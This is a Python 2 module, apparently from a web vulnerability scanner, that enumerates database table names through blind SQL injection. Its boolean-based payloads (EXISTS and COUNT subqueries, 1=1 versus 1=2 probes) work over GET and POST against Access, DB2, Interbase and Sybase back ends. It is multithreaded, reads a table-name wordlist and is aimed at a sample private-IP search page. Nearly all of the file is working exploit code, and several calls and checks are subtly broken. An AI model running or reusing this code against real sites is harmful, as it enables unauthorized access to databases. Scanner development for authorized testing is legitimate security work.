#!/usr/bin/env python
# -*- coding: utf-8 -*-
from Queue import Queue,Empty
import threading
import httplib2
import sys
import os
from lib.common import *

sys_path = lambda relativePath: "%s/%s"%(os.getcwd(), relativePath)

class Enumeration_Tables(threading.Thread):
    def __init__(self,url,queue,Errorkey,response,content,tables,databasetype,HttpType,PostData,sqlinjkey):
        threading.Thread.__init__(self)
        '''
                   枚举数据表，当无法通过报错注入跑出数据库信息时，用该类可枚举出表
        1. 该类采用多线程跑表
        2. 函数命名方式：Get_Int_Access_table：Get:http请求方式，Int:注入类型为数字型，Access：为注入的数据库
        3. Get_Int_or_Str 该函数是用来判断该注入为什么类型的注入
        4. GetExpData 格式化POST提交的数据
        5. Getkey获取注入关键字
        6. 变量sqlinjkey 存放POST注入的参数
        '''
        try:
            
            self.queue=queue
            self.url=url
            http=httplib2.Http()
            self.http=http
            self.tables=tables
            self.Errorkey=Errorkey
            self.response=response
            self.content=content
            self.databasetype=databasetype
            self.HttpType=HttpType
            self.PostData=PostData
            self.sqlinjkey=sqlinjkey
            
        except Exception,e:
            logging.getLogger().error(" Enumeration_table.__init__" + str(e))
            
            
    def run(self):
        try:
            
            intorstr=''   
            intorstr=self.Get_Int_or_Str()
            while True: 
                # if self.queue.empty(): 
                #     break
                # tablename=self.queue.get_nowait()
                #fix BUG #3531
                try:
                    tablename = self.queue.get_nowait()
                except Empty:
                    break
                if self.HttpType=='Get':
                        
                    if intorstr=='1':#数字型
                        if self.databasetype=='access':
                            self.Get_Int_Access_table(tablename)
                        if self.databasetype=='db2' or self.databasetype=='Interbase' or self.databasetype=='sybase':
                            self.Get_Int_Other_table(tablename)
                            
                    if intorstr=='2':#字符型
                        if self.databasetype=='access':
                            self.Get_Str_Access_table(tablename)
                        if self.databasetype=='db2' or self.databasetype=='Interbase' or self.databasetype=='sybase':
                            self.Get_Str_Other_table(tablename)
                if self.HttpType=='Post':
                    if self.databasetype=='access':
                        self.Post_Str_Access_Table(tablename)
                        if len(self.tables)<0:
                            self.Post_Search_Access_Table(tablename)
                    if self.databasetype=='db2' or self.databasetype=='Interbase' or self.databasetype=='sybase':
                        self.Post_Str_Other_Table()
                        if len(self.tables)<0:
                            self.Post_Search_Other_Table() 
            #print '**********************'   
            #print self.tables
            #print '**********************' 
            
        except Exception,e:
            logging.getLogger().error(" Enumeration_table.run" + str(e))


    def Get_Int_Access_table(self,tablename):
        try:
            
            Intexpcode="%%20aNd%%20EXISTS(SELECT%%20*%%20FROM%%20%s)"%(tablename)
            #print Intexpcode
#           r,c=self.http.request("%s%s"%(self.url,Intexpcode))
            r,c=yx_httplib2_request(self.http,"%s%s"%(self.url,Intexpcode))
            if len(self.tables)<=10:
                
            #print tablename,r
                if r.has_key('status') and r['status']!='404' and c.find(self.Errorkey)<0:
                
                    self.tables.append(tablename)
                #print self.tables,tablename
                
        except Exception,e:
            logging.getLogger().error(" Enumeration_table.Get_Int_Access_table" + str(e))
    
    
    #提取关键字 ，没找到关键字就是成功
    def Get_Str_Access_table(self,tablename):
        try:
            
            Strexpcode="%%27%%20aNd%%20EXISTS(SELECT%%20*%%20FROM%%20%s)aNd%%271%%27=%%271"%(tablename)
#           r,c=self.http.request("%s%s"%(self.url,Strexpcode))
            r,c=yx_httplib2_request(self.http,"%s%s"%(self.url,Strexpcode))
            if len(self.tables)<=0:
                              
                if r.has_key('status') and r['status']!='404' and c.find(self.Errorkey)<0:
                    self.tables.append(tablename)
                
        except Exception,e:
            logging.getLogger().error(" Enumeration_table.Get_Str_Access_table" + str(e))
            
            
    def Get_Str_Other_table(self,tablename):
        try:
            
            Intexpcode="%%27aNd(SELECT%%20COUNT(*)%%20FROM%%20%s)>0%%20aNd%%271%%27=%%271"%(tablename)
            #print Intexpcode
#           r,c=self.http.request("%s%s"%(self.url,Intexpcode))
            r,c=yx_httplib2_request(self.http,"%s%s"%(self.url,Intexpcode))
            #print tablename,r
            if r.has_key('status') and r['status']!='404' and c.find(self.Errorkey)<0:
                self.tables.append(tablename)
                #print self.tables,tablename
                
        except Exception,e:
            logging.getLogger().error(" Enumeration_table.Get_Str_Other_table" + str(e))
        
            
    def Get_Search_Other_table(self,tablename):
        try:
            
            Strexpcode="%%%%27aNd(SELECT%%20COUNT(*)%%20FROM%%20%s)And%%27%%%%27=%%27"%(tablename)
#           r,c=self.http.request("%s%s"%(self.url,Strexpcode))   
            r,c=yx_httplib2_request(self.http,"%s%s"%(self.url,Strexpcode))             
            if r.has_key('status') and r['status']!='404' and c.find(self.Errorkey)<0:
                self.tables.append(tablename)
            
        except Exception,e:
            logging.getLogger().error(" Enumeration_table.Get_Search_Other_table" + str(e)) 
        
            
    def Get_Int_or_Str(self):#判断该注入为什么类型
        sqli_type=''
        try:
            
#           re,ce=self.http.request("%s%s"%(self.url,'%20AnD%201=2'))
            re,ce=yx_httplib2_request(self.http,"%s%s"%(self.url,'%20AnD%201=2'))
            if re.has_key('status') and re['status']!='404':
                getkey=self.getkey(ce)
                if getkey:
#                   r,c=self.http.request("%s%s"%(self.url,'%20AnD%201=1'))
                    r,c=yx_httplib2_request(self.http,"%s%s"%(self.url,'%20AnD%201=1'))
                    if c.find(getkey)>=0 and ce.find(getkey)<0 and r.has_key('status') and r['status']!='404':
                        sqli_type='1'
                        return sqli_type#数字型
            
#           re1,ce1=self.http.request("%s%s"%(self.url,'%27%20AnD%20%271=%272'))
            re1,ce1=yx_httplib2_request(self.http,"%s%s"%(self.url,'%27%20AnD%20%271=%272'))
            if re1.has_key('status') and re1['status']!='404':
                getkey=self.getkey(ce1)
                if getkey:
#                   r,c=self.http.request("%s%s"%(self.url,'%27%20AnD%20%271%27=%271'))
                    r,c=yx_httplib2_request(self.http,"%s%s"%(self.url,'%27%20AnD%20%271%27=%271'))
                    if c.find(getkey)>=0 and ce.find(getkey)<0 and r.has_key('status') and r['status']!='404':
                        sqli_type='2'
                        return sqli_type#字符型
                    
        except Exception,e:
            logging.getLogger().error(" Enumeration_table.Get_Int_or_Str" + str(e))
            return sqli_type#返回空
                            
       
        
    def Post_Str_Access_Table(self,tablename):
        
        try:
            
            ExpData=self.GetExpData(self.PostData,self.sqlinjkey)
            Expkey="%%27%%20aNd%%20EXISTS(SELECT%%20*%%20FROM%%20%s)aNd%%271%%27=%%271"%(tablename)
            Exp_PostData="%s%s"%(ExpData,Expkey)
#           r,c=self.http.request(self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
            r,c=yx_httplib2_request(self.http,self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
            if r.has_key('status') and r['status']!='404' and c.find(self.Errorkey)<0:
                self.tables.append(tablename)
                
        except Exception,e:
            logging.getLogger().error(" Enumeration_table.Post_Str_Access_Table" + str(e))
                            
        
        
    
    
    def Post_Search_Access_Table(self,tablename):
        try:
            
            ExpData=self.GetExpData(self.PostData,self.sqlinjkey)
            Expkey="%%%%27%%20aNd%%20EXISTS(SELECT%%20*%%20FROM%%20%s)aNd%%27%%%%27=%%27"%(tablename)
            Exp_PostData="%s%s"%(ExpData,Expkey)
#           r,c=self.http.request(self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
            r,c=yx_httplib2_request(self.http,self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
            if r.has_key('status') and r['status']!='404' and c.find(self.Errorkey)<0:
                self.tables.append(tablename)
                
        except Exception,e:
            logging.getLogger().error(" Enumeration_table.Post_Search_Access_Table" + str(e))
        
    
    
    def Post_Str_Other_Table(self,tablename):
        
        try:
            
            ExpData=self.GetExpData(self.PostData,self.sqlinjkey)
            Expkey="%%27aNd(SELECT%%20COUNT(*)%%20FROM%%20%s)>0%%20aNd%%271%%27=%%271"%(tablename)
            Exp_PostData="%s%s"%(ExpData,Expkey)
#           r,c=self.http.request(self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
            r,c=yx_httplib2_request(self.http,self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
            if r.has_key('status') and r['status']!='404' and c.find(self.Errorkey)<0:
                self.tables.append(tablename)
        except Exception,e:
            logging.getLogger().error(" Enumeration_table.Post_Str_Other_Table" + str(e))
        
    
    
    def Post_Search_Other_Table(self,tablename):
        
        try:
            
            ExpData=self.GetExpData(self.PostData,self.sqlinjkey)
            Expkey="%%%%27aNd(SELECT%%20COUNT(*)%%20FROM%%20%s)>0%%20aNd%%27%%%%27=%%27"%(tablename)
            Exp_PostData="%s%s"%(ExpData,Expkey)
#           r,c=self.http.request(self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
            r,c=yx_httplib2_request(self.http,self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
            if r.has_key('status') and r['status']!='404' and c.find(self.Errorkey)<0:
                self.tables.append(tablename)
                
        except Exception,e:
            logging.getLogger().error(" Enumeration_table.Post_Str_Other_Table" + str(e))   
        
        
    def getkey(self,contenterror):
        listkey=[]
        try:
            
            contentlist=self.content.split("\r\n")
            for i in contentlist:
                if contenterror.find(i)<0:
                    listkey.append(i)
                    if len(listkey)>=2:
                        return listkey[1]
            if len(listkey)==1:
                return None
            if len(listkey)==0:
                return None
        except Exception,e:
            logging.getLogger().error(" Enumeration_table.getkey" + str(e))
            return None

    #end def
    def GetExpData(self,PostData,sqlinjkey):
        
        post_new_data=''
        
        post_data=''
        
        try:
            
            if PostData.find("&")>=0:
               
                postdata_list=PostData.split("&")
               
                for name in postdata_list:
                    
                    name_list=name.split("=")
                    
                    if name_list[0]==sqlinjkey:
                        
                        key_v=name_list[0]+"="+name_list[1]
                        
                        continue
                    
                    else:
                        
                        post_new_data=post_new_data+name+"&"
                        
                post_data=post_new_data+key_v    
                
            else:
                
                post_data=PostData  
                          
        except Exception,e:
            
            logging.getLogger().error(" Enumeration_table.GetExpData" + str(e))
            
        return post_data        

def main(url,Errorkey,DatabaseType,HttpType,PostData='',sqlinjkey=''):

    tables=[]
    
    try:
        
        http = httplib2.Http()
        queue=Queue()    
        filepath = sys_path("/vuls_db/tables.txt")
        f = open(filepath, 'r')
        line=f.readline().strip()
        while line!="":
            queue.put(line)
            line=f.readline().strip()
        thrds = []
#       response,content=http.request(url)
        response,content=yx_httplib2_request(http,url)
        #print response
        for i in range(10):
            thrds.append(Enumeration_Tables(url,queue,Errorkey,response,content,tables,DatabaseType,HttpType,PostData,sqlinjkey))
        #end for
        for t in thrds:
            t.start()
        #end for
        for t in thrds:
            t.join()
        #end for
    except Exception,e:
        logging.getLogger().error(" Enumeration_table.GetExpData" + str(e))
    #print '===-----=====----'
    #print tables
    return tables
    #print '======----===----===----==---'
    
    
if __name__ == '__main__':  
    main('http://192.168.9.99:81/search.asp','Microsoft OLE DB Provider for','access','Post','key=&otype=title&submit2=%CB%D1%CB%F7','key')
    
    
    
